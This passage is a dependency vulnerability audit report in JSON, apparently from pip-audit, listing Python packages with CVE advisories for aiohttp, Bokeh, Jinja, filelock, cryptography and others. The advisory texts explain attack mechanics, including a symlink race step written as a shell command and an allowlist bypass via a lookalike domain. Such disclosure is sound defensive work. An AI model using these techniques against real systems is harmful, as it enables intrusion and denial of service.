{"dependencies": [{"name": "absl-py", "version": "2.3.0", "vulns": []}, {"name": "aiobotocore", "version": "2.12.3", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.4.0", "vulns": []}, {"name": "aiohttp", "version": "3.10.5", "vulns": [{"id": "CVE-2024-52304", "fix_versions": ["3.10.11"], "aliases": ["GHSA-8495-4g3g-x7pr"], "description": "### Summary The Python parser parses newlines in chunk extensions incorrectly which can lead to request smuggling vulnerabilities under certain conditions.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or `AIOHTTP_NO_EXTENSIONS` is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/259edc369075de63e6f3a4eaade058c62af0df71"}, {"id": "CVE-2025-53643", "fix_versions": ["3.12.14"], "aliases": ["GHSA-9548-qrrj-x5pj"], "description": "### Summary The Python parser is vulnerable to a request smuggling vulnerability due to not parsing trailer sections of an HTTP request.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/e8d774f635dc6d1cd3174d0e38891da5de0e2b6a"}, {"id": "CVE-2025-69223", "fix_versions": ["3.13.3"], "aliases": ["GHSA-6mq8-rvhq-8wgg"], "description": "### Summary A zip bomb can be used to execute a DoS against the aiohttp server.  ### Impact An attacker may be able to send a compressed request that when decompressed by aiohttp could exhaust the host's memory.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/2b920c39002cee0ec5b402581779bbaaf7c9138a"}, {"id": "CVE-2025-69224", "fix_versions": ["3.13.3"], "aliases": ["GHSA-69f9-5gxw-wvc2"], "description": "### Summary The Python HTTP parser may allow a request smuggling attack with the presence of non-ASCII characters.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/32677f2adfd907420c078dda6b79225c6f4ebce0"}, {"id": "CVE-2025-69228", "fix_versions": ["3.13.3"], "aliases": ["GHSA-6jhg-hg63-jvvf"], "description": "### Summary A request can be crafted in such a way that an aiohttp server's memory fills up uncontrollably during processing.  ### Impact If an application includes a handler that uses the `Request.post()` method, an attacker may be able to freeze the server by exhausting the memory.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/b7dbd35375aedbcd712cbae8ad513d56d11cce60"}, {"id": "CVE-2025-69229", "fix_versions": ["3.13.3"], "aliases": ["GHSA-g84x-mcqj-x9qq"], "description": "### Summary  Handling of chunked messages can result in excessive blocking CPU usage when receiving a large number of chunks.  ### Impact  If an application makes use of the `request.read()` method in an endpoint, it may be possible for an attacker to cause the server to spend a moderate amount of blocking CPU time (e.g. 1 second) while processing the request. This could potentially lead to DoS as the server would be unable to handle other requests during that time.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/dc3170b56904bdf814228fae70a5501a42a6c712 Patch: https://github.com/aio-libs/aiohttp/commit/4ed97a4e46eaf61bd0f05063245f613469700229"}, {"id": "CVE-2025-69230", "fix_versions": ["3.13.3"], "aliases": ["GHSA-fh55-r93g-j68g"], "description": "### Summary Reading multiple invalid cookies can lead to a logging storm.  ### Impact If the ``cookies`` attribute is accessed in an application, then an attacker may be able to trigger a storm of warning-level logs using a specially crafted Cookie header.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/64629a0834f94e46d9881f4e99c41a137e1f3326"}, {"id": "CVE-2025-69226", "fix_versions": ["3.13.3"], "aliases": ["GHSA-54jq-c3m8-4m76"], "description": "### Summary Path normalization for static files prevents path traversal, but opens up the ability for an attacker to ascertain the existence of absolute path components.  ### Impact If an application uses `web.static()` (not recommended for production deployments), it may be possible for an attacker to ascertain the existence of path components.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/f2a86fd5ac0383000d1715afddfa704413f0711e"}, {"id": "CVE-2025-69227", "fix_versions": ["3.13.3"], "aliases": ["GHSA-jj3x-wxrx-4x23"], "description": "### Summary When assert statements are bypassed, an infinite loop can occur, resulting in a DoS attack when processing a POST body.  ### Impact If optimisations are enabled (`-O` or `PYTHONOPTIMIZE=1`), and the application includes a handler that uses the `Request.post()` method, then an attacker may be able to execute a DoS attack with a specially crafted message.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/bc1319ec3cbff9438a758951a30907b072561259"}, {"id": "CVE-2025-69225", "fix_versions": ["3.13.3"], "aliases": ["GHSA-mqqc-3gqh-h2x8"], "description": "### Summary  The parser allows non-ASCII decimals to be present in the Range header.  ### Impact  There is no known impact, but there is the possibility that there's a method to exploit a request smuggling vulnerability.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/c7b7a044f88c71cefda95ec75cdcfaa4792b3b96"}]}, {"name": "aioitertools", "version": "0.7.1", "vulns": []}, {"name": "aiosignal", "version": "1.2.0", "vulns": []}, {"name": "alabaster", "version": "0.7.16", "vulns": []}, {"name": "altair", "version": "5.0.1", "vulns": []}, {"name": "altgraph", "version": "0.17.5", "vulns": []}, {"name": "anaconda-anon-usage", "skip_reason": "Dependency not found on PyPI and could not be audited: anaconda-anon-usage (0.4.4)"}, {"name": "anaconda-catalogs", "version": "0.2.0", "vulns": []}, {"name": "anaconda-client", "skip_reason": "Dependency not found on PyPI and could not be audited: anaconda-client (1.12.3)"}, {"name": "anaconda-cloud-auth", "version": "0.5.1", "vulns": []}, {"name": "anaconda-navigator", "skip_reason": "Dependency not found on PyPI and could not be audited: anaconda-navigator (2.6.3)"}, {"name": "anaconda-project", "skip_reason": "Dependency not found on PyPI and could not be audited: anaconda-project (0.11.1)"}, {"name": "annotated-doc", "version": "0.0.4", "vulns": []}, {"name": "annotated-types", "version": "0.6.0", "vulns": []}, {"name": "anyio", "version": "4.2.0", "vulns": []}, {"name": "appdirs", "version": "1.4.4", "vulns": []}, {"name": "archspec", "version": "0.2.3", "vulns": []}, {"name": "argon2-cffi", "version": "21.3.0", "vulns": []}, {"name": "argon2-cffi-bindings", "version": "21.2.0", "vulns": []}, {"name": "arrow", "version": "1.2.3", "vulns": []}, {"name": "astroid", "version": "2.14.2", "vulns": []}, {"name": "astropy", "version": "6.1.3", "vulns": []}, {"name": "astropy-iers-data", "version": "0.2024.9.2.0.33.23", "vulns": []}, {"name": "asttokens", "version": "2.0.5", "vulns": []}, {"name": "astunparse", "version": "1.6.3", "vulns": []}, {"name": "async-lru", "version": "2.0.4", "vulns": []}, {"name": "atomicwrites", "version": "1.4.0", "vulns": []}, {"name": "attrs", "version": "23.1.0", "vulns": []}, {"name": "audioread", "version": "3.1.0", "vulns": []}, {"name": "automat", "version": "20.2.0", "vulns": []}, {"name": "autopep8", "version": "2.0.4", "vulns": []}, {"name": "babel", "version": "2.11.0", "vulns": []}, {"name": "bcrypt", "version": "3.2.0", "vulns": []}, {"name": "beautifulsoup4", "version": "4.12.3", "vulns": []}, {"name": "binaryornot", "version": "0.4.4", "vulns": []}, {"name": "black", "version": "24.8.0", "vulns": []}, {"name": "bleach", "version": "4.1.0", "vulns": []}, {"name": "blinker", "version": "1.6.2", "vulns": []}, {"name": "blis", "version": "1.2.0", "vulns": []}, {"name": "bokeh", "version": "3.6.0", "vulns": [{"id": "CVE-2026-21883", "fix_versions": ["3.8.2"], "aliases": ["GHSA-793v-589g-574v"], "description": "This vulnerability allows for **Cross-Site WebSocket Hijacking (CSWSH)** of a deployed Bokeh server instance.   ### Scope  This vulnerability is only relevant to deployed Bokeh server instances. There is no impact on static HTML output, standalone embedded plots, or Jupyter notebook usage.   This vulnerability does not prevent any requirements for up-front authentication on Bokeh servers that have authentication hooks in place, and cannot be used to make Bokeh servers deployed on private, internal networks accessible outside those networks.   ### Impact  If a Bokeh server is configured with an allowlist (e.g., `dashboard.corp`), an attacker can register a domain like `dashboard.corp.attacker.com` (or use a subdomain if applicable) and lure a victim to visit it. The malicious site can then initiate a WebSocket connection to the vulnerable Bokeh server. Since the Origin header (e.g., `http://dashboard.corp.attacker.com/`) matches the allowlist according to the flawed logic, the connection is accepted.  Once connected, the attacker can interact with the Bokeh server on behalf of the victim, potentially accessing sensitive data, or modifying visualizations.  ### Patches Patched in versions 3.8.2 and later.  ### Workarounds  None  ### Technical description  The `match_host` function in `src/bokeh/server/util.py` contains a flaw in how it compares hostnames against the allowlist patterns. The function uses Python's `zip()` function to iterate over the parts of the hostname and the pattern simultaneously. However, `zip()` stops iteration when the shortest iterable is exhausted.  Because the code only checks if the *pattern* is longer than the *host* (lines 232-233), but fails to check if the *host* is longer than the *pattern*, a host that **starts** with the pattern (but has additional segments) will successfully match.  For example, if the allowlist is configured to `['[example.com](http://example.com/)']`, the function will incorrectly validate `[example.com.bad.com](http://example.com.evil.com/)` as a match: 1. `host` parts: `['example', 'com', 'bad', 'com']` 2. `pattern` parts: `['example', 'com']` 3. `zip` compares `example==example` (OK) and `com==com` (OK). 4. Iteration stops, and the function returns `True`."}]}, {"name": "boltons", "version": "23.0.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "botocore", "version": "1.34.69", "vulns": []}, {"name": "bottleneck", "version": "1.3.7", "vulns": []}, {"name": "brotli", "version": "1.0.9", "vulns": [{"id": "CVE-2025-6176", "fix_versions": ["1.2.0"], "aliases": ["GHSA-2qfp-q593-8484"], "description": "Scrapy versions up to 2.13.3 are vulnerable to a denial of service (DoS) attack due to a flaw in its brotli decompression implementation. The protection mechanism against decompression bombs fails to mitigate the brotli variant, allowing remote servers to crash clients with less than 80GB of available memory. This occurs because brotli can achieve extremely high compression ratios for zero-filled data, leading to excessive memory consumption during decompression. Mitigation for this vulnerability needs security enhancement added in brotli v1.2.0."}]}, {"name": "cachecontrol", "version": "0.14.4", "vulns": []}, {"name": "cachetools", "version": "5.3.3", "vulns": []}, {"name": "catalogue", "version": "2.0.10", "vulns": []}, {"name": "certifi", "version": "2025.10.5", "vulns": []}, {"name": "cffi", "version": "1.17.1", "vulns": []}, {"name": "cfgv", "version": "3.5.0", "vulns": []}, {"name": "chardet", "version": "5.2.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.3.2", "vulns": []}, {"name": "chunspell", "version": "2.0.4", "vulns": []}, {"name": "click", "version": "8.3.1", "vulns": []}, {"name": "click-default-group", "version": "1.2.4", "vulns": []}, {"name": "cloudpathlib", "version": "0.21.0", "vulns": []}, {"name": "cloudpickle", "version": "3.0.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "colorcet", "version": "3.1.0", "vulns": []}, {"name": "comm", "version": "0.2.1", "vulns": []}, {"name": "conda", "skip_reason": "Dependency not found on PyPI and could not be audited: conda (24.11.3)"}, {"name": "conda-build", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-build (24.9.0)"}, {"name": "conda-content-trust", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-content-trust (0.2.0)"}, {"name": "conda-index", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-index (0.5.0)"}, {"name": "conda-libmamba-solver", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-libmamba-solver (24.9.0)"}, {"name": "conda-pack", "version": "0.7.1", "vulns": []}, {"name": "conda-package-handling", "version": "2.3.0", "vulns": []}, {"name": "conda-package-streaming", "version": "0.10.0", "vulns": []}, {"name": "conda-repo-cli", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-repo-cli (1.0.114)"}, {"name": "conda-token", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-token (0.5.0+1.g2209e04)"}, {"name": "confection", "version": "0.1.5", "vulns": []}, {"name": "constantly", "version": "23.10.4", "vulns": []}, {"name": "contourpy", "version": "1.2.0", "vulns": []}, {"name": "cookiecutter", "version": "2.6.0", "vulns": []}, {"name": "coverage", "version": "7.13.1", "vulns": []}, {"name": "cryptography", "version": "43.0.0", "vulns": [{"id": "GHSA-h4gh-qq45-vh27", "fix_versions": ["43.0.1"], "aliases": [], "description": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 37.0.0-43.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20240903.txt.  If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions. "}, {"id": "CVE-2024-12797", "fix_versions": ["44.0.1"], "aliases": ["GHSA-79v4-65xg-pq4g"], "description": "pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 42.0.0-44.0.0 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://openssl-library.org/news/secadv/20250211.txt.  If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions."}, {"id": "CVE-2026-26007", "fix_versions": ["46.0.5"], "aliases": ["GHSA-r6ph-v2qm-q3c2"], "description": "## Vulnerability Summary  The `public_key_from_numbers` (or `EllipticCurvePublicNumbers.public_key()`), `EllipticCurvePublicNumbers.public_key()`, `load_der_public_key()` and `load_pem_public_key()` functions do not verify that the point belongs to the expected prime-order subgroup of the curve.  This missing validation allows an attacker to provide a public key point `P` from a small-order subgroup.  This can lead to security issues in various situations, such as the most commonly used signature verification (ECDSA) and shared key negotiation (ECDH). When the victim computes the shared secret as `S = [victim_private_key]P` via ECDH,  this leaks information about `victim_private_key mod (small_subgroup_order)`. For curves with cofactor > 1, this reveals the least significant bits of the private key.  When these weak public keys are used in ECDSA , it's easy to forge signatures on the small subgroup.  Only SECT curves are impacted by this.  ## Credit  This vulnerability was discovered by: - XlabAI Team of Tencent Xuanwu Lab - Atuin Automated Vulnerability Discovery Engine"}]}, {"name": "cssselect", "version": "1.2.0", "vulns": []}, {"name": "cssselect2", "version": "0.8.0", "vulns": []}, {"name": "curated-tokenizers", "version": "0.0.9", "vulns": []}, {"name": "curated-transformers", "version": "0.1.1", "vulns": []}, {"name": "cycler", "version": "0.11.0", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "11.6.0", "vulns": []}, {"name": "cymem", "version": "2.0.11", "vulns": []}, {"name": "cytoolz", "version": "0.12.2", "vulns": []}, {"name": "dask", "version": "2024.8.2", "vulns": []}, {"name": "dask-expr", "version": "1.1.13", "vulns": []}, {"name": "datashader", "version": "0.16.3", "vulns": []}, {"name": "debugpy", "version": "1.6.7", "vulns": []}, {"name": "decorator", "version": "5.1.1", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "diff-match-patch", "version": "20200713", "vulns": []}, {"name": "dill", "version": "0.3.8", "vulns": []}, {"name": "distlib", "version": "0.4.0", "vulns": []}, {"name": "distributed", "version": "2024.8.2", "vulns": [{"id": "CVE-2026-23528", "fix_versions": ["2026.1.0"], "aliases": ["GHSA-c336-7962-wfj2"], "description": "### Impact When [Jupyter Lab](https://jupyterlab.readthedocs.io/en/latest/), [jupyter-server-proxy](https://github.com/jupyterhub/jupyter-server-proxy) and [Dask distributed](https://github.com/dask/distributed) are all run together it is possible to craft a URL which will result in code being executed by Jupyter due to a cross-side-scripting (XSS) bug in the Dask dashboard.  It is possible for attackers to craft a phishing URL that assumes Jupyter Lab and Dask may be running on localhost and using default ports. If a user clicks on the malicious link it will open an error page in the Dask Dashboard via the Jupyter Lab proxy which will cause code to be executed by the default Jupyter Python kernel.  In order for a user to be impacted they must be running Jupyter Lab locally on the default port (with the [jupyter-server-proxy](https://github.com/jupyterhub/jupyter-server-proxy)) and a Dask distributed cluster on the default port. Then they would need to click the link which would execute the malicious code.  ### Patches This has been fixed in the `2026.1.0` release. All users should upgrade to this version.  ### Mitigations There are no known workarounds for this bug. The only complete solution is to upgrade to a newer release of Dask. However, there are a few things you could do to reduce your risk.  It is possible to avoid code execution via Jupyter by uninstalling the [jupyter-server-proxy](https://github.com/jupyterhub/jupyter-server-proxy) and accessing the Dask dashboard directly at it's URL. However, it is still possible for an attacker to craft a URL that executes JavaScript in the user's browser in the Dask dashboard. Which is still a moderate vulnerability. Therefore we recommend all users upgrade to the latest Dask release.  Another potential mitigation is to ensure both Jupyter and the Dask dashboard are running on non-standard ports. While this doesn't resolve the problem it reduces the chance of this being exploited. If an attacker knew which ports you were using they could still craft a malicious URL, but it would require a more targeted attack."}]}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "docstring-to-markdown", "version": "0.11", "vulns": []}, {"name": "docutils", "version": "0.18.1", "vulns": []}, {"name": "ebooklib", "version": "0.20", "vulns": []}, {"name": "editdistpy", "version": "0.1.6", "vulns": []}, {"name": "en-core-web-sm", "skip_reason": "Dependency not found on PyPI and could not be audited: en-core-web-sm (3.8.0)"}, {"name": "es-core-news-lg", "skip_reason": "Dependency not found on PyPI and could not be audited: es-core-news-lg (3.8.0)"}, {"name": "es-core-news-md", "skip_reason": "Dependency not found on PyPI and could not be audited: es-core-news-md (3.8.0)"}, {"name": "es-core-news-sm", "skip_reason": "Dependency not found on PyPI and could not be audited: es-core-news-sm (3.8.0)"}, {"name": "es-dep-news-trf", "skip_reason": "Dependency not found on PyPI and could not be audited: es-dep-news-trf (3.8.0)"}, {"name": "et-xmlfile", "version": "1.1.0", "vulns": []}, {"name": "execnet", "version": "2.1.1", "vulns": []}, {"name": "executing", "version": "0.8.3", "vulns": []}, {"name": "factory-boy", "version": "3.3.3", "vulns": []}, {"name": "faker", "version": "37.3.0", "vulns": []}, {"name": "fastapi", "version": "0.129.0", "vulns": []}, {"name": "fastjsonschema", "version": "2.16.2", "vulns": []}, {"name": "filelock", "version": "3.20.2", "vulns": [{"id": "CVE-2026-22701", "fix_versions": ["3.20.3"], "aliases": ["GHSA-qmgc-5h2g-mvrw"], "description": "## Vulnerability Summary  **Title:** Time-of-Check-Time-of-Use (TOCTOU) Symlink Vulnerability in SoftFileLock  **Affected Component:** `filelock` package - `SoftFileLock` class **File:** `src/filelock/_soft.py` lines 17-27 **CWE:** CWE-362, CWE-367, CWE-59  ---  ## Description  A TOCTOU race condition vulnerability exists in the `SoftFileLock` implementation of the filelock package. An attacker with local filesystem access and permission to create symlinks can exploit a race condition between the permission validation and file creation to cause lock operations to fail or behave unexpectedly.  The vulnerability occurs in the `_acquire()` method between `raise_on_not_writable_file()` (permission check) and `os.open()` (file creation). During this race window, an attacker can create a symlink at the lock file path, potentially causing the lock to operate on an unintended target file or leading to denial of service.  ### Attack Scenario  ``` 1. Lock attempts to acquire on /tmp/app.lock 2. Permission validation passes 3. [RACE WINDOW] - Attacker creates: ln -s /tmp/important.txt /tmp/app.lock 4. os.open() tries to create lock file 5. Lock operates on attacker-controlled target file or fails ```  ---  ## Impact  _What kind of vulnerability is it? Who is impacted?_  This is a **Time-of-Check-Time-of-Use (TOCTOU) race condition vulnerability** affecting any application using `SoftFileLock` for inter-process synchronization.  **Affected Users:** - Applications using `filelock.SoftFileLock` directly - Applications using the fallback `FileLock` on systems without `fcntl` support (e.g., GraalPy)  **Consequences:** - **Silent lock acquisition failure** - applications may not detect that exclusive resource access is not guaranteed - **Denial of Service** - attacker can prevent lock file creation by maintaining symlink - **Resource serialization failures** - multiple processes may acquire \"locks\" simultaneously - **Unintended file operations** - lock could operate on attacker-controlled files  **CVSS v4.0 Score:** 5.6 (Medium) **Vector:** CVSS:4.0/AV:L/AT:L/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N  **Attack Requirements:** - Local filesystem access to the directory containing lock files - Permission to create symlinks (standard for regular unprivileged users on Unix/Linux) - Ability to time the symlink creation during the narrow race window  ---  ## Patches  _Has the problem been patched? What versions should users upgrade to?_  Yes, the vulnerability has been patched by adding the `O_NOFOLLOW` flag to prevent symlink following during lock file creation.  **Patched Version:** Next release (commit: 255ed068bc85d1ef406e50a135e1459170dd1bf0)  **Mitigation Details:** - The `O_NOFOLLOW` flag is added conditionally and gracefully degrades on platforms without support - On platforms with `O_NOFOLLOW` support (most modern systems): symlink attacks are completely prevented - On platforms without `O_NOFOLLOW` (e.g., GraalPy): TOCTOU window remains but is documented  **Users should:** - Upgrade to the patched version when available - For critical deployments, consider using `UnixFileLock` or `WindowsFileLock` instead of the fallback `SoftFileLock`  ---  ## Workarounds  _Is there a way for users to fix or remediate the vulnerability without upgrading?_  For users unable to update immediately:  1. **Avoid `SoftFileLock` in security-sensitive contexts** - use `UnixFileLock` or `WindowsFileLock` when available (these were already patched for CVE-2025-68146)  2. **Restrict filesystem permissions** - prevent untrusted users from creating symlinks in lock file directories:    ```bash    chmod 700 /path/to/lock/directory    ```  3. **Use process isolation** - isolate untrusted code from lock file paths to prevent symlink creation  4. **Monitor lock operations** - implement application-level checks to verify lock acquisitions are successful before proceeding with critical operations  ---  ## References  _Are there any links users can visit to find out more?_  - **Similar Vulnerability:** CVE-2025-68146 (TOCTOU vulnerability in UnixFileLock/WindowsFileLock) - **CWE-362 (Concurrent Execution using Shared Resource):** https://cwe.mitre.org/data/definitions/362.html - **CWE-367 (Time-of-check Time-of-use Race Condition):** https://cwe.mitre.org/data/definitions/367.html - **CWE-59 (Improper Link Resolution Before File Access):** https://cwe.mitre.org/data/definitions/59.html - **O_NOFOLLOW documentation:** https://man7.org/linux/man-pages/man2/open.2.html - **GitHub Repository:** https://github.com/tox-dev/filelock  ---  **Reported by:** George Tsigourakos (@tsigouris007)"}]}, {"name": "flake8", "version": "7.0.0", "vulns": []}, {"name": "flask", "version": "3.0.3", "vulns": []}, {"name": "flatbuffers", "version": "24.3.25", "vulns": []}, {"name": "fonttools", "version": "4.61.1", "vulns": []}, {"name": "frozendict", "version": "2.4.2", "vulns": []}, {"name": "frozenlist", "version": "1.4.0", "vulns": []}, {"name": "fsspec", "version": "2024.6.1", "vulns": []}, {"name": "gast", "version": "0.6.0", "vulns": []}, {"name": "gdown", "version": "5.2.0", "vulns": []}, {"name": "gensim", "version": "4.3.3", "vulns": []}, {"name": "gitdb", "version": "4.0.7", "vulns": []}, {"name": "gitpython", "version": "3.1.43", "vulns": []}, {"name": "google-pasta", "version": "0.2.0", "vulns": []}, {"name": "greenlet", "version": "3.0.1", "vulns": []}, {"name": "grpcio", "version": "1.71.0", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "h5py", "version": "3.11.0", "vulns": []}, {"name": "heapdict", "version": "1.0.1", "vulns": []}, {"name": "hf-xet", "version": "1.2.0", "vulns": []}, {"name": "holoviews", "version": "1.19.1", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httptools", "version": "0.7.1", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "huggingface-hub", "version": "0.36.0", "vulns": []}, {"name": "hvplot", "version": "0.11.0", "vulns": []}, {"name": "hyperlink", "version": "21.0.0", "vulns": []}, {"name": "identify", "version": "2.6.15", "vulns": []}, {"name": "idna", "version": "3.7", "vulns": []}, {"name": "imagecodecs", "version": "2023.1.23", "vulns": [{"id": "PYSEC-2023-174", "fix_versions": ["2023.9.18"], "aliases": [], "description": "imagecodecs versions before v2023.9.18 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). imagecodecs v2023.9.18 upgrades the bundled libwebp binary to v1.3.2."}, {"id": "GHSA-94vc-p8w7-5p49", "fix_versions": ["2023.9.18"], "aliases": [], "description": "imagecodecs versions before v2023.9.18 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). imagecodecs v2023.9.18 upgrades the bundled libwebp binary to v1.3.2."}]}, {"name": "imageio", "version": "2.33.1", "vulns": []}, {"name": "imagesize", "version": "1.4.1", "vulns": []}, {"name": "imbalanced-learn", "version": "0.12.3", "vulns": []}, {"name": "importlib-metadata", "version": "7.0.1", "vulns": []}, {"name": "incremental", "version": "22.10.0", "vulns": []}, {"name": "inflection", "version": "0.5.1", "vulns": []}, {"name": "iniconfig", "version": "1.1.1", "vulns": []}, {"name": "intake", "version": "2.0.7", "vulns": []}, {"name": "intervaltree", "version": "3.1.0", "vulns": []}, {"name": "ipykernel", "version": "6.28.0", "vulns": []}, {"name": "ipython", "version": "8.30.0", "vulns": []}, {"name": "ipython-genutils", "version": "0.2.0", "vulns": []}, {"name": "ipywidgets", "version": "7.8.1", "vulns": []}, {"name": "isort", "version": "5.13.2", "vulns": []}, {"name": "itemadapter", "version": "0.3.0", "vulns": []}, {"name": "itemloaders", "version": "1.1.0", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jaraco-classes", "version": "3.2.1", "vulns": []}, {"name": "jedi", "version": "0.19.1", "vulns": []}, {"name": "jellyfish", "version": "1.0.1", "vulns": []}, {"name": "jinja2", "version": "3.1.4", "vulns": [{"id": "CVE-2024-56326", "fix_versions": ["3.1.5"], "aliases": ["GHSA-q2x7-8rv6-6q7h"], "description": "An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.  To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.  Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox."}, {"id": "CVE-2024-56201", "fix_versions": ["3.1.5"], "aliases": ["GHSA-gmj6-6f8f-6699"], "description": "A bug in the Jinja compiler allows an attacker that controls both the content and filename of a template to execute arbitrary Python code, regardless of if Jinja's sandbox is used.  To exploit the vulnerability, an attacker needs to control both the filename and the contents of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates where the template author can also choose the template filename."}, {"id": "CVE-2025-27516", "fix_versions": ["3.1.6"], "aliases": ["GHSA-cpwx-vrp4-4pq7"], "description": "An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.  To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.  Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup."}]}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "joblib", "version": "1.5.3", "vulns": []}, {"name": "json5", "version": "0.9.6", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpointer", "version": "2.1", "vulns": []}, {"name": "jsonschema", "version": "4.23.0", "vulns": []}, {"name": "jsonschema-specifications", "version": "2023.7.1", "vulns": []}, {"name": "jupyter", "version": "1.1.1", "vulns": []}, {"name": "jupyter-client", "version": "8.6.0", "vulns": []}, {"name": "jupyter-console", "version": "6.6.3", "vulns": []}, {"name": "jupyter-core", "version": "5.7.2", "vulns": [{"id": "CVE-2025-30167", "fix_versions": ["5.8.1"], "aliases": ["GHSA-33p9-3p43-82vq"], "description": "## Impact  On Windows, the shared `%PROGRAMDATA%` directory is searched for configuration files (`SYSTEM_CONFIG_PATH` and `SYSTEM_JUPYTER_PATH`), which may allow users to create configuration files affecting other users.  Only shared Windows systems with multiple users and unprotected `%PROGRAMDATA%` are affected.  ## Mitigations  - upgrade to `jupyter_core>=5.8.1` (5.8.0 is patched but breaks `jupyter-server`) , or - as administrator, modify the permissions on the `%PROGRAMDATA%` directory so it is not writable by unauthorized users, or - as administrator, create the `%PROGRAMDATA%\\jupyter` directory with appropriately restrictive permissions, or - as user or administrator, set the `%PROGRAMDATA%` environment variable to a directory with appropriately restrictive permissions (e.g. controlled by administrators _or_ the current user)  ## Credit  Reported via Trend Micro Zero Day Initiative as ZDI-CAN-25932"}]}, {"name": "jupyter-events", "version": "0.10.0", "vulns": []}, {"name": "jupyter-lsp", "version": "2.2.0", "vulns": [{"id": "CVE-2024-22415", "fix_versions": ["2.2.2"], "aliases": ["GHSA-4qhp-652w-c22x"], "description": "### Impact Installations of jupyter-lsp running in environments without configured file system access control (on the operating system level), and with jupyter-server instances exposed to non-trusted network are vulnerable to unauthorised access and modification of file system beyond the jupyter root directory.  ### Patches Version 2.2.2 has been patched.  ### Workarounds Users of jupyterlab who do not use jupyterlab-lsp can uninstall jupyter-lsp.  ### Credits We would like to credit Bary Levy, researcher of pillar.security research team, for the discovery and responsible disclosure of this vulnerability.  Edit: based on advice from pillar.security the Confidentiality/Integrity/Availability were increased to High to reflect potential for critical impact on publicly hosted jupyter-server instances lacking isolation of user privileges on operating system level (for best practices please consult https://jupyterhub.readthedocs.io/en/stable/explanation/websecurity.html#protect-users-from-each-other) and CWE-94 was added due to a potential vulnerability chaining in specific environments."}]}, {"name": "jupyter-server", "version": "2.14.1", "vulns": []}, {"name": "jupyter-server-terminals", "version": "0.4.4", "vulns": []}, {"name": "jupyterlab", "version": "4.2.5", "vulns": [{"id": "CVE-2025-59842", "fix_versions": ["4.4.8"], "aliases": ["BIT-jupyterlab-2025-59842", "GHSA-vvfj-2jqx-52jm"], "description": "Links generated with LaTeX typesetters in Markdown files and Markdown cells in JupyterLab and Jupyter Notebook did not include the `noopener` attribute.  This is deemed to have no impact on the default installations. Theoretically users of third-party LaTeX-rendering extensions could find themselves vulnerable to reverse tabnabbing attacks if: - links generated by those extensions included `target=_blank` (no such extensions are known at time of writing) and - they were to click on a link generated in LaTeX (typically visibly different from other links).  For consistency with handling on other links, new versions of JupyterLab will enforce `noopener` and `target=_blank` 